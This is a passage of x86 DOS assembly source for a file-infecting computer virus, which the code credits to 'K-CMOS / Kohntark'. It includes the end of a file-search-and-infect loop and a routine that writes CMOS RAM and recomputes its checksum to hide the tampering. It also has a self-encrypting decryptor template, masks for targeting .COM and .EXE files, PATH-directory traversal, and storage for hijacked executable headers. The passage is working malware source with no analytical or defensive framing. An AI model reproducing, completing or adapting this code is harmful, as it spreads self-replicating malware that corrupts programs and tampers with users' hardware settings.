                      cmp al,0                 ;end of ASCIIZ string?
                      jne MOVE_ASCII_FILENAME  ;keep on going
                      pop si                   ;restore si to use in the following
                      push bp                  ;save COM / EXE string pointer
                      call CHECK_N_INFECT_FILE ;check file if file found
                      pop  bp                  ;restore COM / EXE string pointer
                      jnc  EXITX
                      mov  bx,si               ;fix bx
                      push si                  ;save si again
                      mov ah,04Fh
                      jmp short FIND_NEXT_FILE

EXIT:
                      pop  si
EXITX:
                      ret

;==============================================================================
CMOS_CHCKSM:

; INPUT:
; DL = CMOS ADDRESS of BYTE TO be MODiFiED
; BL = NEW BYTE VALUE to be PUT IN CMOS RAM

; OUTPUT:
; None.
; REGISTERS USED: AX,CX,BX,DX

;*************************
; GET CMOS Checksum => CX
;*************************

        xor     ax,ax
        mov     al,2Eh           ;msb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    ch,al            ;store al in ch

        mov     al,2Fh           ;lsb of checksum address
        out     70h,al           ;send address / control byte
        in      al,71h           ;read byte

        xchg    cl,al            ;store lsb to cl

;*********************
; Fix CMOS Checksum
;*********************

        push    dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;send address / control byte
        in      al,71h          ;read register

        sub     cx,ax           ;subtract from checksum

        add     cx,bx           ;update checksum value in register.

;****************************
; Write CMOS byte to Address
;****************************

        pop     dx
        xchg    dl,al           ;AL = address
        out     70h,al          ;specify CMOS address
        xchg    al,bl           ;new CMOS value => al

        out     71h,al          ;write new CMOS byte

;*********************
; Write CMOS Checksum
;*********************

        mov     al,2Eh          ;address of checksum 's msb
        out     70h,al          ;specify CMOS address
        xchg    al,ch           ;msb of new checksum

        out     71h,al          ;write new CMOS msb

        mov     al,2Fh          ;address of checksum 's lsb
        out     70h,al          ;specify CMOS address
        xchg    al,cl           ;lsb of new checksum

        out     71h,al          ;write new CMOS lsb
        ret

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

NAME_AUTHOR     db  'K-CM”S / K”hntark'

WORK_BUFFER     db  0B9h,00,00                     ;mov  cx,VSIZE
                db  0BBh,00,00                     ;mov  si,VADDRESS
                db  02Eh,081h,07,00,00             ;add WORD PTR cs:[si],KEY
                db  083h,0C3h,02                   ;add si,02
               ;db  043h,043h                      ;inc bx, inc bx
                db  0E2h,0F6h                      ;loop add..

COM_MASK        db  '*.COM',0
EXE_MASK        db  '*.EXE',0
PATH_STR        db  'PATH=',0

START_IMAGE     db  0E9h,0,0,020h

ORIG_SSSP       dw  0,0
ORIG_IPCS       dw  0,0
COM_FLAG        db  0                   ;0=COM 1=EXE
START_CODE      db  4 dup (90h)         ;4 bytes of COM or EXE hdr goes here

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

FINAL:                ;label of byte of code to be kept in virus when it moves

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

HEAP:

START_CODE2      db  24d dup (0)         ;2nd part of EXE hdr

PSP_SEG         dw  0

PATH_ADDRESS    dw  0
FILENAME_PTR    dw  0
WORK_AREA       db  64 DUP (0),'$'

DTA             db 21 dup(0)  ;reserved
DTA_File_Attr   db ?
DTA_File_Time   dw ?
DTA_File_Date   dw ?
DTA_File_Size   dd ?
DTA_File_Name   db 13 dup(0)

;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

ID               equ 77h
DECRYPTOR_SIZE   equ 16d ; equ OFFSET WORK_BUFFER - OFFSET START_IMAGE

MAIN ENDS
     END    HOST

